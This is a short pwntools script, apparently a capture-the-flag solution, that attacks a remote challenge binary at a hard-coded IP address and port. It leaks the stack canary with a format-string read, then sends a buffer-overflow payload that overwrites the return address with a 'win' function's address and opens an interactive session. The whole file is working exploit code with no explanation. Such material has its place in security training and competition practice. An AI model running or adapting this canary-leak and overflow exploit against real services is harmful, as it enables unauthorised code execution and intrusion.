from pwn import *
import time
elf = ELF("./chall")
context.binary=elf
#target=process([elf.path])
target=remote('220.249.52.134',59587)
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

win=0x4008DA
fs="%23$p"
sla("battle \n",str(2))
time.sleep(0.1)
target.send(fs)
canary=int(target.recv(18)[2:],16)
print("[+]canary="+hex(canary))
sla("battle \n",str(1))
payload="A"*0x88+p64(canary)+"A"*8+p64(win)
time.sleep(0.1)
target.send(payload)
target.interactive()
